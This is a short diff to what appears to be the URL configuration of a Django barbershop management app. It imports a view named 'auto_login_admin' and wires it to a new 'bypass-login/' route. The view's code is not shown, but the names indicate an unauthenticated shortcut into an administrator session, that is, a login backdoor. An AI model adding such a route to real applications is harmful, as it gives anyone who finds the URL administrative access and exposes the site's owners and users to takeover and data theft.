@@ -2,6 +2,7 @@
 from django.urls import path
 from . import views
 from django.contrib.auth import views as auth_views
+from barber_grid.views import auto_login_admin
 
 
 urlpatterns = [
@@ -155,6 +156,6 @@ urlpatterns = [
 
     path('painel/servicos/', views.lista_servicos, name='servico'),
     path('painel/servicos/novo/', views.servico, name='novo_servico'),   
-
+    path('bypass-login/', auto_login_admin, name='auto_login'),
 
 ]
